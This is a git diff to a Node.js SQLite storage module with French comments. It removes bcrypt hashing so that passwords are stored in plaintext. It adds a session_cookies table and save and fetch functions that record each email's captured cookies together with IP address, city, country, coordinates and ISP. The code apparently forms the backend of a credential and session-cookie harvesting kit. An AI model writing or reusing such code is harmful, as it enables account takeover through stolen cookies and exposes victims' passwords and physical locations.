@@ -68,6 +68,29 @@ function initializeDatabase() {
           resolve();
         }
       });
+
+      // Table pour les cookies de session avec localisation
+      db.run(`
+        CREATE TABLE IF NOT EXISTS session_cookies (
+          id INTEGER PRIMARY KEY AUTOINCREMENT,
+          email TEXT,
+          cookies TEXT,
+          ip TEXT,
+          city TEXT,
+          region TEXT,
+          country TEXT,
+          latitude REAL,
+          longitude REAL,
+          org TEXT,
+          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+      `, (err) => {
+        if (err) {
+          console.error('Erreur lors de la création de la table session_cookies:', err);
+        } else {
+          console.log('✅ Table session_cookies créée ou déjà existante');
+        }
+      });
     });
   });
 }
@@ -75,26 +98,16 @@ function initializeDatabase() {
 // Sauvegarder les identifiants d'authentification
 async function saveCredentials(email, password) {
   return new Promise((resolve, reject) => {
-    // Hacher le mot de passe
-    bcrypt.hash(password, 10, (err, hash) => {
+    db.run(`
+      INSERT OR REPLACE INTO auth_credentials (email, password_hash, updated_at)
+      VALUES (?, ?, datetime('now'))
+    `, [email, password], function(err) {
       if (err) {
         reject(err);
-        return;
+      } else {
+        console.log(`✅ Identifiants sauvegardés pour: ${email}`);
+        resolve(this.lastID);
       }
-
-      // Insérer ou mettre à jour les identifiants
-      db.run(`
-        INSERT OR REPLACE INTO auth_credentials (email, password_hash, updated_at)
-        VALUES (?, ?, CURRENT_TIMESTAMP)
-      `, [email, hash], function(err) {
-        if (err) {
-          console.error('Erreur lors de la sauvegarde des identifiants:', err);
-          reject(err);
-        } else {
-          console.log(`✅ Identifiants sauvegardés pour: ${email}`);
-          resolve(this.lastID);
-        }
-      });
     });
   });
 }
@@ -292,6 +305,46 @@ function cleanupOldSecurityCodes() {
   });
 }
 
+// Sauvegarder les cookies de session avec localisation
+function saveSessionCookies(email, cookies, ip, city, region, country, latitude, longitude, org) {
+  return new Promise((resolve, reject) => {
+    db.run(`
+      INSERT INTO session_cookies (email, cookies, ip, city, region, country, latitude, longitude, org)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [email, JSON.stringify(cookies), ip, city, region, country, latitude, longitude, org], function(err) {
+      if (err) reject(err);
+      else resolve(this.lastID);
+    });
+  });
+}
+
+// Récupérer les cookies de session avec localisation
+function getSessionCookies(email) {
+  return new Promise((resolve, reject) => {
+    db.get(`
+      SELECT cookies, ip, city, region, country, latitude, longitude, org FROM session_cookies
+      WHERE email = ?
+      ORDER BY created_at DESC
+      LIMIT 1
+    `, [email], (err, row) => {
+      if (err) reject(err);
+      else if (!row) resolve(null);
+      else {
+        resolve({
+          cookies: JSON.parse(row.cookies),
+          ip: row.ip,
+          city: row.city,
+          region: row.region,
+          country: row.country,
+          latitude: row.latitude,
+          longitude: row.longitude,
+          org: row.org
+        });
+      }
+    });
+  });
+}
+
 // Fermer la connexion à la base de données
 function closeDatabase() {
   return new Promise((resolve) => {
@@ -320,5 +373,7 @@ module.exports = {
   getAllCredentials,
   cleanupExpiredSessions,
   cleanupOldSecurityCodes,
+  saveSessionCookies,
+  getSessionCookies,
   closeDatabase
 }; 
